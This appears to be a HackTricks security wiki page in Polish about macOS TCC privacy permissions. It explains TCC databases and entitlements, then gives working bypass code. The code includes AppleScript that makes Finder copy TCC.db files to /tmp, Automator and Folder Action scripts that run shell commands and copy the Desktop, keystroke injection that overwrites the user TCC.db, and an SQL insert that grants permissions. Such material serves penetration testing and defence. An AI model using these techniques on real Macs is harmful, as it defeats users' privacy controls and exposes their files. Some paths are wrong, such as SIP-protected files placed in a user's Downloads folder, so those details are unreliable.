# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Podstawowe informacje**

**TCC (Transparentność, Zgoda i Kontrola)** to protokół bezpieczeństwa koncentrujący się na regulowaniu uprawnień aplikacji. Jego główną rolą jest ochrona wrażliwych funkcji, takich jak **usługi lokalizacji, kontakty, zdjęcia, mikrofon, kamera, dostęp do pełnego dysku**. Poprzez wymóg wyraźnej zgody użytkownika przed przyznaniem aplikacji dostępu do tych elementów, TCC zwiększa prywatność i kontrolę użytkownika nad swoimi danymi.

Użytkownicy napotykają TCC, gdy aplikacje żądają dostępu do chronionych funkcji. Jest to widoczne poprzez monit, który pozwala użytkownikom **zatwierdzić lub odmówić dostępu**. Ponadto TCC umożliwia bezpośrednie działania użytkownika, takie jak **przeciąganie i upuszczanie plików do aplikacji**, aby przyznać dostęp do konkretnych plików, zapewniając, że aplikacje mają dostęp tylko do tego, co jest wyraźnie dozwolone.

![Przykład monitu TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** jest obsługiwany przez **demon** znajdujący się w `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` i skonfigurowany w `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (rejestrując usługę mach `com.apple.tccd.system`).

Istnieje **tccd w trybie użytkownika** działający dla każdego zalogowanego użytkownika zdefiniowanego w `/System/Library/LaunchAgents/com.apple.tccd.plist`, rejestrujący usługi mach `com.apple.tccd` i `com.apple.usernotifications.delegate.com.apple.tccd`.

Tutaj możesz zobaczyć tccd działający jako system i jako użytkownik:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Uprawnienia są **dziedziczone z aplikacji nadrzędnej** a **uprawnienia** są **śledzone** na podstawie **Bundle ID** i **Developer ID**.

### Bazy danych TCC

Zezwolenia/odmowy są następnie przechowywane w niektórych bazach danych TCC:

- Baza danych systemowa w **`/Library/Application Support/com.apple.TCC/TCC.db`**.
- Ta baza danych jest **chroniona przez SIP**, więc tylko obejście SIP może do niej zapisać.
- Użytkownik TCC baza danych **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** dla preferencji per użytkownik.
- Ta baza danych jest chroniona, więc tylko procesy z wysokimi uprawnieniami TCC, takie jak Pełny dostęp do dysku, mogą do niej zapisać (ale nie jest chroniona przez SIP).

> [!WARNING]
> Poprzednie bazy danych są również **chronione przez TCC dla dostępu do odczytu**. Więc **nie będziesz w stanie odczytać** swojej regularnej bazy danych TCC użytkownika, chyba że pochodzi z procesu z uprawnieniami TCC.
>
> Jednak pamiętaj, że proces z tymi wysokimi uprawnieniami (jak **FDA** lub **`kTCCServiceEndpointSecurityClient`**) będzie mógł zapisać bazę danych TCC użytkowników.

- Istnieje **trzecia** baza danych TCC w **`/var/db/locationd/clients.plist`**, aby wskazać klientów, którym zezwolono na **dostęp do usług lokalizacji**.
- Plik chroniony przez SIP **`/Users/carlospolop/Downloads/REG.db`** (również chroniony przed dostępem do odczytu z TCC) zawiera **lokację** wszystkich **ważnych baz danych TCC**.
- Plik chroniony przez SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (również chroniony przed dostępem do odczytu z TCC) zawiera więcej przyznanych uprawnień TCC.
- Plik chroniony przez SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (czytelny dla każdego) jest listą dozwolonych aplikacji, które wymagają wyjątku TCC.

> [!TIP]
> Baza danych TCC w **iOS** znajduje się w **`/private/var/mobile/Library/TCC/TCC.db`**.

> [!NOTE]
> **Interfejs użytkownika centrum powiadomień** może wprowadzać **zmiany w systemowej bazie danych TCC**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Jednak użytkownicy mogą **usuwać lub zapytywać zasady** za pomocą narzędzia wiersza poleceń **`tccutil`**.

#### Zapytanie o bazy danych

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Sprawdzając obie bazy danych, możesz sprawdzić, jakie uprawnienia aplikacja przyznała, zabroniła lub ich nie ma (poprosi o nie).

- **`service`** to reprezentacja ciągu uprawnień TCC
- **`client`** to **ID pakietu** lub **ścieżka do binarnego** z uprawnieniami
- **`client_type`** wskazuje, czy jest to identyfikator pakietu (0) czy ścieżka bezwzględna (1)

<details>

<summary>Jak wykonać, jeśli to ścieżka bezwzględna</summary>

Po prostu wykonaj **`launctl load you_bin.plist`**, z plistą taką jak:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** może mieć różne wartości: denied(0), unknown(1), allowed(2) lub limited(3).
- **`auth_reason`** może przyjąć następujące wartości: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Pole **csreq** jest używane do wskazania, jak zweryfikować binarny plik do wykonania i przyznania uprawnień TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Aby uzyskać więcej informacji na temat **innych pól** tabeli [**sprawdź ten wpis na blogu**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Możesz również sprawdzić **już przyznane uprawnienia** dla aplikacji w `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Użytkownicy _mogą_ **usuwać lub zapytywać zasady** za pomocą **`tccutil`**.

#### Zresetuj uprawnienia TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

Baza danych TCC **przechowuje** **Bundle ID** aplikacji, ale także **przechowuje** **informacje** o **podpisie**, aby **upewnić się**, że aplikacja prosząca o użycie uprawnienia jest tą właściwą.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Dlatego inne aplikacje używające tej samej nazwy i identyfikatora pakietu nie będą mogły uzyskać dostępu do przyznanych uprawnień dla innych aplikacji.

### Uprawnienia i uprawnienia TCC

Aplikacje **nie tylko muszą** **prosić** i **otrzymać dostęp** do niektórych zasobów, ale także muszą **mieć odpowiednie uprawnienia**.\
Na przykład **Telegram** ma uprawnienie `com.apple.security.device.camera`, aby zażądać **dostępu do kamery**. Aplikacja, która **nie ma** tego **uprawnienia, nie będzie mogła** uzyskać dostępu do kamery (a użytkownik nie zostanie nawet poproszony o przyznanie uprawnień).

Jednakże, aby aplikacje mogły **uzyskać dostęp** do **niektórych folderów użytkownika**, takich jak `~/Desktop`, `~/Downloads` i `~/Documents`, **nie muszą** mieć żadnych specyficznych **uprawnień.** System przejrzysto obsłuży dostęp i **poprosi użytkownika** w razie potrzeby.

Aplikacje Apple **nie będą generować powiadomień**. Zawierają **wcześniej przyznane prawa** w swojej liście **uprawnień**, co oznacza, że **nigdy nie wygenerują okna dialogowego**, **ani** nie pojawią się w żadnej z **baz danych TCC.** Na przykład:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
To uniknie, aby Kalendarz prosił użytkownika o dostęp do przypomnień, kalendarza i książki adresowej.

> [!TIP]
> Oprócz oficjalnej dokumentacji na temat uprawnień, możliwe jest również znalezienie nieoficjalnych **interesujących informacji o uprawnieniach w** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Niektóre uprawnienia TCC to: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Nie ma publicznej listy, która definiuje wszystkie z nich, ale możesz sprawdzić tę [**listę znanych**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Wrażliwe, niechronione miejsca

- $HOME (sam w sobie)
- $HOME/.ssh, $HOME/.aws, itd.
- /tmp

### Intencje użytkownika / com.apple.macl

Jak wspomniano wcześniej, możliwe jest **przyznanie dostępu aplikacji do pliku poprzez przeciągnięcie i upuszczenie go na nią**. Ten dostęp nie będzie określony w żadnej bazie danych TCC, ale jako **rozszerzony** **atrybut pliku**. Ten atrybut **przechowa UUID** dozwolonej aplikacji:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!NOTE]
> Ciekawe, że atrybut **`com.apple.macl`** jest zarządzany przez **Sandbox**, a nie przez tccd.
>
> Zauważ również, że jeśli przeniesiesz plik, który pozwala na UUID aplikacji na swoim komputerze do innego komputera, ponieważ ta sama aplikacja będzie miała różne UIDs, nie przyzna dostępu do tej aplikacji.

Rozszerzony atrybut `com.apple.macl` **nie może być usunięty** jak inne rozszerzone atrybuty, ponieważ jest **chroniony przez SIP**. Jednak, jak [**wyjaśniono w tym poście**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), możliwe jest jego wyłączenie **zipując** plik, **usuwając** go i **rozpakowując** go.

## TCC Privesc & Bypassy

### Wstaw do TCC

Jeśli w pewnym momencie uda ci się uzyskać dostęp do zapisu w bazie danych TCC, możesz użyć czegoś takiego jak poniżej, aby dodać wpis (usuń komentarze):

<details>

<summary>Wstaw do TCC przykład</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Jeśli udało Ci się uzyskać dostęp do aplikacji z pewnymi uprawnieniami TCC, sprawdź następującą stronę z ładunkami TCC, aby je wykorzystać:

{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Dowiedz się o Apple Events w:

{{#ref}}
macos-apple-events.md
{{#endref}}

### Automatyzacja (Finder) do FDA\*

Nazwa TCC dla uprawnienia Automatyzacji to: **`kTCCServiceAppleEvents`**\
To konkretne uprawnienie TCC wskazuje również **aplikację, która może być zarządzana** w bazie danych TCC (więc uprawnienia nie pozwalają tylko na zarządzanie wszystkim).

**Finder** to aplikacja, która **zawsze ma FDA** (nawet jeśli nie pojawia się w interfejsie użytkownika), więc jeśli masz **uprawnienia Automatyzacji** nad nią, możesz wykorzystać jej uprawnienia, aby **wykonać pewne akcje**.\
W tym przypadku Twoja aplikacja potrzebowałaby uprawnienia **`kTCCServiceAppleEvents`** nad **`com.apple.Finder`**.

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Kradzież systemów TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Możesz to wykorzystać do **napisania własnej bazy danych TCC użytkownika**.

> [!WARNING]
> Dzięki temu uprawnieniu będziesz mógł **poprosić Findera o dostęp do folderów z ograniczeniami TCC** i uzyskać pliki, ale o ile mi wiadomo, **nie będziesz mógł zmusić Findera do wykonania dowolnego kodu**, aby w pełni wykorzystać jego dostęp do FDA.
>
> Dlatego nie będziesz mógł w pełni wykorzystać możliwości FDA.

To jest monit TCC, aby uzyskać uprawnienia Automacji nad Finderem:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Zauważ, że ponieważ aplikacja **Automator** ma uprawnienie TCC **`kTCCServiceAppleEvents`**, może **kontrolować każdą aplikację**, taką jak Finder. Mając uprawnienie do kontrolowania Automatora, możesz również kontrolować **Findera** za pomocą kodu takiego jak poniżej:

<details>

<summary>Uzyskaj powłokę wewnątrz Automatora</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

To samo dotyczy **aplikacji Script Editor,** może kontrolować Finder, ale używając AppleScript nie można zmusić jej do wykonania skryptu.

### Automatyzacja (SE) do niektórych TCC

**System Events mogą tworzyć akcje folderów, a akcje folderów mogą uzyskiwać dostęp do niektórych folderów TCC** (Pulpit, Dokumenty i Pobrane), więc skrypt taki jak poniższy może być użyty do nadużycia tego zachowania:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automatyzacja (SE) + Dostępność (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** do FDA\*

Automatyzacja na **`System Events`** + Dostępność (**`kTCCServicePostEvent`**) pozwala na wysyłanie **naciśnięć klawiszy do procesów**. W ten sposób można nadużyć Findera, aby zmienić TCC.db użytkownika lub przyznać FDA dowolnej aplikacji (chociaż może być wymagane hasło).

Przykład nadpisywania TCC.db użytkownika przez Findera:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` do FDA\*

Sprawdź tę stronę, aby uzyskać kilka [**ładunków do nadużywania uprawnień Dostępności**](macos-tcc-payloads.md#accessibility) do privesc do FDA\* lub uruchomienia keyloggera na przykład.

### **Klient Bezpieczeństwa Punktu do FDA**

Jeśli masz **`kTCCServiceEndpointSecurityClient`**, masz FDA. Koniec.

### Plik Polityki Systemowej SysAdmin do FDA

**`kTCCServiceSystemPolicySysAdminFiles`** pozwala na **zmianę** atrybutu **`NFSHomeDirectory`** użytkownika, co zmienia jego folder domowy i tym samym pozwala na **obejście TCC**.

### Baza Danych TCC Użytkownika do FDA

Uzyskując **uprawnienia do zapisu** w bazie danych **TCC użytkownika**, nie możesz przyznać sobie **`FDA`** uprawnień, tylko ten, który znajduje się w bazie danych systemowej, może to przyznać.

Ale możesz **przyznać** sobie **`Prawa Automatyzacji do Findera`** i nadużyć poprzedniej techniki, aby uzyskać dostęp do FDA\*.

### **FDA do uprawnień TCC**

**Pełny dostęp do dysku** to nazwa TCC **`kTCCServiceSystemPolicyAllFiles`**

Nie sądzę, że to jest prawdziwe privesc, ale na wszelki wypadek, jeśli uznasz to za przydatne: Jeśli kontrolujesz program z FDA, możesz **zmodyfikować bazę danych TCC użytkowników i przyznać sobie dowolny dostęp**. Może to być przydatne jako technika utrzymywania dostępu w przypadku, gdy możesz stracić swoje uprawnienia FDA.

### **Obejście SIP do Obejścia TCC**

Baza danych **TCC systemu** jest chroniona przez **SIP**, dlatego tylko procesy z **wskazanymi uprawnieniami będą mogły ją modyfikować**. Dlatego, jeśli atakujący znajdzie **obejście SIP** nad **plikem** (będzie mógł modyfikować plik ograniczony przez SIP), będzie mógł:

- **Usunąć ochronę** bazy danych TCC i przyznać sobie wszystkie uprawnienia TCC. Może nadużyć dowolnego z tych plików, na przykład:
- Baza danych systemowa TCC
- REG.db
- MDMOverrides.plist

Jednak istnieje inna opcja, aby nadużyć tego **obejścia SIP do obejścia TCC**, plik `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` jest listą dozwolonych aplikacji, które wymagają wyjątku TCC. Dlatego, jeśli atakujący może **usunąć ochronę SIP** z tego pliku i dodać swoją **własną aplikację**, aplikacja będzie mogła obejść TCC.\
Na przykład, aby dodać terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypassy

{{#ref}}
macos-tcc-bypassy/
{{#endref}}

## Odniesienia

- [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
